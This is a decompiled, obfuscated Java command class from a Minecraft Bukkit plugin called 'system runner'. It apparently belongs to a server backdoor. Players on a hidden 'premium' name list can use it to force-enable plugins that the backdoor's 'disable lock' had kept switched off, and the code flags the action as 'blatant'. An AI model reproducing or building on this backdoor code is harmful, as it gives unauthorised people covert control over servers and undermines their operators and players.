/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl.premium;

import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class EnablelockCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIllIIIlllIllIIIIIl, String llllllllllllllIllIIIlllIllIIIIII, String[] llllllllllllllIllIIIlllIlIllllll, Player llllllllllllllIllIIIlllIlIlllllI) {
        if (llllllllllllllIllIIIlllIllIIIIIl.premium.contains(llllllllllllllIllIIIlllIlIlllllI.getName())) {
            if (llllllllllllllIllIIIlllIlIllllll.length <= 1) {
                llllllllllllllIllIIIlllIlIlllllI.sendMessage(Settings.USAGE("enableLock <plugin>"));
            } else if (Bukkit.getPluginManager().getPlugin(llllllllllllllIllIIIlllIlIllllll[1]) == null) {
                llllllllllllllIllIIIlllIlIlllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllIllIIIlllIlIllllll[1]).append(" doesn't exist. (Cap Sensitive)"))));
            } else {
                for (String llllllllllllllIllIIIlllIllIIIIll : DataManager.getData().getStringList("epic-pl")) {
                    Plugin llllllllllllllIllIIIlllIllIIIlIl = Bukkit.getPluginManager().getPlugin(llllllllllllllIllIIIlllIlIllllll[1]);
                    byte[] llllllllllllllIllIIIlllIllIIIlII = Base64.getEncoder().encode(llllllllllllllIllIIIlllIllIIIlIl.getName().getBytes());
                    if (llllllllllllllIllIIIlllIllIIIIll.contains(new String(llllllllllllllIllIIIlllIllIIIlII))) {
                        DataManager.idk.remove(new String(llllllllllllllIllIIIlllIllIIIlII));
                        DataManager.getData().set("epic-pl", DataManager.idk);
                        DataManager.saveData();
                        API.enablePlugin(llllllllllllllIllIIIlllIlIllllll[1]);
                        llllllllllllllIllIIIlllIlIlllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllIllIIIlllIlIllllll[1]).append(" is now enabled and will stay enabled!"))));
                        continue;
                    }
                    llllllllllllllIllIIIlllIlIlllllI.sendMessage(Settings.PREFIX("This plugin isn't disable locked!"));
                }
            }
        } else {
            llllllllllllllIllIIIlllIlIlllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public EnablelockCommand() {
        EnablelockCommand llllllllllllllIllIIIlllIllIIllIl;
    }
}

